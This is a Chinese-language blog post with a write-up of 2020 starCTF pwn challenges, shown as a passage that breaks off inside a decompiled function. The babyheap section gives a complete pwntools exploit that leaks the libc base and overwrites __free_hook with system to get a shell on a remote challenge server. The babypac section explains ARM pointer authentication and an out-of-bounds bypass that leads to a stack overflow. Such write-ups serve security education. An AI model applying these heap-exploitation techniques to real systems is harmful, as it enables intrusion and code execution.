<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2020 starCTF 部分pwn WriteUp | LYYL' Blog</title><meta name="keywords" content="LYYL, Blog, Pwn, pwn"><meta name="author" content="LYYL"><meta name="copyright" content="LYYL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="感谢xmzyshypnc 师傅手把手教学。 babyheap漏洞是一个UAF漏洞，程序实现了6个程序，add,delete,edit,show,leave_name,show_name，其中add函数限制了申请堆块的大小，delete函数中存在UAF漏洞，leave_name函数中申请了一个0x400大小的堆块。 因此这里首先申请4个0x20,fastbin，接着leave_name函数申请一个较">
<meta property="og:type" content="article">
<meta property="og:title" content="2020 starCTF 部分pwn WriteUp">
<meta property="og:url" content="https://www.lyyl.online/posts/922614085.html">
<meta property="og:site_name" content="LYYL&#39; Blog">
<meta property="og:description" content="感谢xmzyshypnc 师傅手把手教学。 babyheap漏洞是一个UAF漏洞，程序实现了6个程序，add,delete,edit,show,leave_name,show_name，其中add函数限制了申请堆块的大小，delete函数中存在UAF漏洞，leave_name函数中申请了一个0x400大小的堆块。 因此这里首先申请4个0x20,fastbin，接着leave_name函数申请一个较">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-55.jpeg">
<meta property="article:published_time" content="2021-01-18T04:07:10.000Z">
<meta property="article:modified_time" content="2022-05-26T07:56:59.322Z">
<meta property="article:author" content="LYYL">
<meta property="article:tag" content="LYYL, Blog, Pwn, pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-55.jpeg"><link rel="shortcut icon" href="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png"><link rel="canonical" href="https://www.lyyl.online/posts/922614085"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
  google_ad_client: 'ca-pub-8740935439028405',
  enable_page_level_ads: 'true'
});</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-MBZHBXMDJ2"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-MBZHBXMDJ2');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '2020 starCTF 部分pwn WriteUp',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-26 15:56:59'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-55.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">LYYL' Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2020 starCTF 部分pwn WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2021-01-18T04:07:10.000Z" title="undefined 2021-01-18 12:07:10">2021-01-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-WriteUp/">CTF WriteUp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>38分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2020 starCTF 部分pwn WriteUp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>感谢<a target="_blank" rel="noopener external nofollow noreferrer" href="https://ama2in9.top/">xmzyshypnc</a> 师傅手把手教学。</p>
<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>漏洞是一个<code>UAF</code>漏洞，程序实现了<code>6</code>个程序，<code>add,delete,edit,show,leave_name,show_name</code>，其中<code>add</code>函数限制了申请堆块的大小，<code>delete</code>函数中存在<code>UAF</code>漏洞，<code>leave_name</code>函数中申请了一个<code>0x400</code>大小的堆块。</p>
<p>因此这里首先申请<code>4</code>个<code>0x20,fastbin</code>，接着<code>leave_name</code>函数申请一个较大的堆块，使得<code>fastbin</code>堆块合并成<code>0x80</code>大小的<code>small bin</code>，这样就能泄漏出<code>libc</code>基址，由于<code>edit</code>的起始位置是<code>+8</code>开始的，因此再次申请的堆块大小需要覆盖三个<code>fastbin</code>，因此申请一个<code>0x60</code>大小的堆块。这样就可以满足覆写<code>fd</code>指针为<code>free_hook-8</code>和<code>/bin/sh</code>字符串两个要求。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *$rebase(0xdd9)&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;52.152.231.198&#x27;</span>, <span class="number">8081</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; \n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input index\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input size\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; \n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input index\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; \n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input index\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;input content\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; \n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input index\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave_name</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; \n&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;your name:\n&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_name</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; \n&quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    add(i, <span class="number">0x18</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">leave_name(<span class="string">&quot;1212&quot;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0xd0</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i + <span class="number">4</span>, <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0xdd9)&quot;)</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x60</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x61</span>) + p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x8</span>)</span><br><span class="line">payload += <span class="string">b&quot;b&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x21</span>) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">edit(<span class="number">11</span>, payload)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x50</span>)</span><br><span class="line">edit(<span class="number">13</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="babypac"><a href="#babypac" class="headerlink" title="babypac"></a>babypac</h2><h3 id="Pointer-Authentication-Code-PAC机制"><a href="#Pointer-Authentication-Code-PAC机制" class="headerlink" title="Pointer Authentication Code, PAC机制"></a>Pointer Authentication Code, PAC机制</h3><p>在<code>2016</code>年的时候ARMv8架构里增加了<code>ARMv8.3-A</code>，这个版本里增加了<code>Pointer Authentication</code> 指令：强化指针安全的一种机制，用来增强栈溢出的保护。该种机制使用指针地址的高位<code>bit</code>（一般来说是高<code>7bit</code>）存储特定于某个指针的签名，之所以可以这样做是因为在当前<code>64</code>位的<code>linux</code>下地址空间也就是指针的实际长度并不是<code>64</code>位。用来计算签名的<code>key</code>存放在处理器内部不可见的寄存器里面。</p>
<p>使用<code>pa</code>机制之后代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+--------------------------------------------------------------------+</span><br><span class="line">|           | No SSP                    |   SSP                      |</span><br><span class="line">+-----------|---------------------------|----------------------------+</span><br><span class="line">|           | SUB sp, sp, #0x40         | ` PACIASP `                |</span><br><span class="line">|           | STP x29, x30, [sp,#0x30]  | SUB sp, sp, #0x40          |</span><br><span class="line">| Prologue  | ADD x29, sp, #0x30        | STP x29, x30, [sp,#0x30]   |</span><br><span class="line">|           | ...                       | ADD x29, sp, #0x30         |</span><br><span class="line">|           |                           | ...                        |</span><br><span class="line">+-----------|---------------------------|----------------------------+</span><br><span class="line">|           | ...                       | ...                        |</span><br><span class="line">|           | LDP x29,x30,[sp,#0x30]    | LDP x29,x30,[sp,#0x30]     |</span><br><span class="line">| Epilogue  | ADD sp,sp,#0x40           | ADD sp,sp,#0x40            |</span><br><span class="line">|           | RET                       | ` AUTIASP `                |</span><br><span class="line">|           |                           | RET                        |</span><br><span class="line">+--------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>这里<code>RETAA</code>指令就相当于<code>AUTIASP,RET</code>两个指令的组合。此时的返回地址为加密之后的返回地址指针，如<code>0x400ff8-&gt;0x51000000400ff8</code>。因此攻击者很难通过栈溢出覆写返回地址，因为其并不知道该地址加密之后的值，具体来说是指针高<code>7bint</code>的值。</p>
<p>标准中使用的变体<code>QARMA-64</code>，将一个<code>128 bit</code>密钥，一个<code>64 bit</code>明文值（指针）和一个<code>64 bit</code>调整项（上下文，<code>context</code>）作为输入，并产生一个<code>64 bit</code>密钥作为输出<code>128bit</code> 密文。，该机制提供五个<code>128bit (Pointer Authentication)PA keys</code>，其中<code>APIAkey,APIBkey</code>两个密钥用来加密指令指针，<code>APDAKey,APDBKey</code>用来加密数据指针，<code>APGAKey</code>是一个特殊的全局密钥，通过<code>PACGA</code>指令加密大块的数据。</p>
<ul>
<li><code>PAC*</code>指令用来在当前的指针中生成和插入<code>PAC</code>，例如<code>PACIA x8,x9</code>将使用<code>APIAKey</code>密钥对<code>x8</code>中保存的指针进行加密，其中<code>x9</code>中的内容当作<code>context</code>。将加密之后的结果输出到<code>x8</code>中。<code>PACIZA</code>指令类似，只不过将<code>context</code>固定为<code>0</code>。</li>
<li><code>AUT*</code>指令用来验证<code>PAC</code>的正确性，如果正确则恢复解密后的指针，否则将错误代码写入指针的高位<code>bit</code>，触发错误。<code>AUTIA x8, x9</code>则是将<code>x9</code>中的内容用作<code>context</code>，<code>APIAKey</code>作为密钥解密<code>x8</code>中的指针。</li>
<li><code>XPAC*</code>则是清除指令中的<code>PAC</code>机制，恢复原本的指针而不经过验证。</li>
<li><code>BLRA*</code>指令是组合跳转指令，用于验证和跳转，<code>BLRAA x8,x9</code>验证<code>PAC</code>正确之后，跳转到<code>x8</code>指针指向的指令地址。</li>
<li><code>LDRA*</code>指令是组合数据加载指令，用于验证和数据加载，<code>LDRAA x8,x9</code>验证正确之后将解密之后的地址出的<code>64bit</code>数据<code>load</code>到<code>x8</code>中</li>
<li><code>RETA*</code>指令是组合返回指令，用于验证和<code>ret</code>。<code>LR</code>寄存器中的指针验证正确之后即跳转。<code>RETAB</code>是用<code>APIBKey</code>密钥验证<code>LR</code>寄存器的值。</li>
</ul>
<p>机制可能存在的问题：如果攻击者可以进行任意代码执行，并且程序中存在<code>signing gadget</code>也就是可以<code>sign</code>任意指针的函数。那么攻击者就可以劫持执行流指向该函数，伪造任意的<code>pac</code>加密指针。</p>
<p>更详细的分析参考<a target="_blank" rel="noopener external nofollow noreferrer" href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html">这里</a></p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>回到这个题目，题目首先输入<code>name</code>，实现了四种功能<code>add,lock,show,auth</code>，其中定义了一个<code>user</code>的结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> my_user         struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, mappedto_37)</span><br><span class="line"><span class="number">00000000</span> id              DCQ ?</span><br><span class="line"><span class="number">00000008</span> is_lock         DCQ ?</span><br><span class="line"><span class="number">00000010</span> my_user         ends</span><br></pre></td></tr></table></figure>

<p><code>add</code>用来增加一个<code>user</code>结构体，<code>lock</code>用来对<code>user</code>种的<code>id</code>进行加密，<code>show</code>函数用来输出<code>name</code>和所有的<code>user</code>结构体的数据。<code>auth</code>是漏洞函数，题目的漏洞很简单，绕过特定的条件之后就会给出一个栈溢出的漏洞。关键是条件怎么绕过，我们看一下代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">int</span>)index &lt; <span class="number">5</span> &amp;&amp; *(_QWORD *)&amp;name[<span class="number">16</span> * (<span class="type">int</span>)index + <span class="number">0x20</span>] &amp;&amp; *(_QWORD *)&amp;name[<span class="number">16</span> * (<span class="type">int</span>)index + <span class="number">0x28</span>] == <span class="number">1LL</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = *(my_user **)&amp;name[<span class="number">0x10</span> * (<span class="type">int</span>)index + <span class="number">0x20</span>];</span><br><span class="line">  index = encrypt(<span class="number">0x10A9FC70042</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == (my_user *)index )</span><br><span class="line">    index = overflow();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是我们输入的<code>id</code>是<code>32bit</code>，这里的<code>0x10A9FC70042LL</code>很明显超过了四个字节，因此直接为<code>id</code>赋值走不通。这里注意到<code>lock</code>函数存在一个越界漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">lock</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 index; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [xsp+1Ch] [xbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  index = readint();</span><br><span class="line">  v1 = index;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)index &lt; <span class="number">5</span> &amp;&amp; *(_QWORD *)&amp;name[<span class="number">16</span> * (<span class="type">int</span>)index + <span class="number">32</span>] &amp;&amp; !*(_QWORD *)&amp;name[<span class="number">16</span> * (<span class="type">int</span>)index + <span class="number">40</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    index = encrypt(user_list[(<span class="type">int</span>)index].id);</span><br><span class="line">    user_list[v1].id = index;</span><br><span class="line">    user_list[v1].is_lock = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> index;</span><br></pre></td></tr></table></figure>

<p>其没有判断<code>index&lt;0</code>的情况。并且这里<code>name,user_list</code>相距很近</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0000000000412030</span> ; <span class="type">char</span> name[<span class="number">32</span>]</span><br><span class="line">.bss:<span class="number">0000000000412030</span> name            % <span class="number">0x20</span>                  ; DATA XREF: add+<span class="number">10</span>↑o</span><br><span class="line">.bss:<span class="number">0000000000412030</span>                                         ; lock+<span class="number">40</span>↑o ...</span><br><span class="line">.bss:<span class="number">0000000000412050</span> ; <span class="class"><span class="keyword">struct</span> <span class="title">my_user</span> <span class="title">user_list</span>[5]</span></span><br><span class="line"><span class="class">.<span class="title">bss</span>:</span><span class="number">0000000000412050</span> user_list       % <span class="number">0x50</span>                  ; DATA XREF: lock+<span class="number">7</span>C↑o</span><br><span class="line">.bss:<span class="number">0000000000412050</span> ; .bss          ends</span><br></pre></td></tr></table></figure>

<p>因此我们可以首先在<code>name</code>中布局好<code>0x10A9FC70042LL</code>的值，接着利用越界漏洞加密该值即可绕过验证。此时我们就可以进入到溢出函数中。但是这里又存在一个问题就是无法获取返回地址。在调试的过程中我们发现<code>lock</code>函数传给<code>encrypt</code>并不是我们输入的数据，而是<code>PACIA</code>过后的数据，也就是如果我们将<code>name</code>设置为<code>0x400ff8</code>其加密的数据是<code>0x51000000400ff8</code>，那么此时如果通过<code>show</code>函数泄漏出加密之后的值，再解密即可得到返回地址加密之后的数据。</p>
<p>看一下加密函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="type">unsigned</span> __int64)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>) ^ ((a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="type">unsigned</span> __int64)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>)) &lt;&lt; <span class="number">31</span>) ^ ((a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="type">unsigned</span> __int64)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>) ^ ((a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="type">unsigned</span> __int64)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>)) &lt;&lt; <span class="number">31</span>)) &gt;&gt; <span 